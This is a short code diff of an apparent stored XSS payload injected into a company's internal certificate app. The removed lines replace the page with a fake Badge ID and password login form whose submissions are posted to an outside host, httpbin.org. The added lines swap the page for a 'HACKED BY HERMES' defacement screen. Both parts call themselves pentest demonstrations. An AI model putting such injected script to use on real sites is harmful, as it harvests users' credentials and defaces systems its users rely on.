@@ -16,10 +16,5 @@ if(u.includes('/admin/')){
     });
   });
 } else {
-  document.body.innerHTML=`<div style='text-align:center;padding-top:80px;font-family:sans-serif;background:#fff;min-height:100vh'><img src='/static/image/CompanyLogo.ico' width=80><h1 style='color:#d9534f'>Sistem Sertifikat Diakses</h1><p>Demo stored XSS & phishing oleh Hermes.</p><form id=f style='max-width:320px;margin:30px auto;text-align:left'><label>Badge ID</label><input name=badge_id style='width:100%;margin:5px 0' required><label>Password</label><input type=password name=password style='width:100%;margin:5px 0' required><button type=submit style='width:100%'>Login</button></form></div>`;
-  document.getElementById('f').onsubmit=function(e){
-    e.preventDefault();
-    let data=new URLSearchParams(new FormData(e.target));
-    fetch('https://httpbin.org/post',{method:'POST',body:data}).then(()=>{alert('Demo selesai. Data tidak disimpan.');});
-  };
+  document.documentElement.innerHTML=`<head><title>HACKED BY HERMES</title><meta name='viewport' content='width=device-width,initial-scale=1'></head><body style='margin:0;font-family:sans-serif;background:#000;color:#0f0;text-align:center;padding-top:15vh'><h1 style='font-size:48px'>HACKED BY HERMES</h1><p>Sanindo Multi Tekno internal app has been compromised.</p><p>This is a non-destructive pentest demonstration.</p><p style='margin-top:40px'><small>Contact: security@suriota.com</small></p></body>`;
 }
